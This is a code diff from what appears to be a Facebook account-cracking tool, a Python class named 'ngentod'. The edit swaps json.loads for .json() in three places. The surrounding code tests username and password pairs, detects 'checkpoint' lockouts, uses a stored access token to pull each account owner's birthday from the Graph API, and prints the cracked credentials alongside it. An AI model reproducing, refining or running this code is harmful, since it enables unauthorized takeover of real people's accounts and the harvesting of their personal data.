@@ -693,7 +693,7 @@ class ngentod:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     romz = open('token.txt').read()
-                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)['birthday']
+                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     day, month, year = lahir.split('/')
                     month = bulan12[month]
                     print ('\r %s*--> %s ◊ %s ◊ %s %s %s  '%(K,user,pw,day,month,year))
@@ -737,7 +737,7 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('data/token.txt').read()
-                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)['birthday']
+                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     day, month, year = lahir.split('/')
                     month = bulan12[month]
                     print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,user,pw,day,month,year))
@@ -796,7 +796,7 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('data/token.txt').read()
-                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)['birthday']
+                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     day, month, year = lahir.split('/')
                     month = bulan12[month]
                     print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,user,pw,day,month,year))
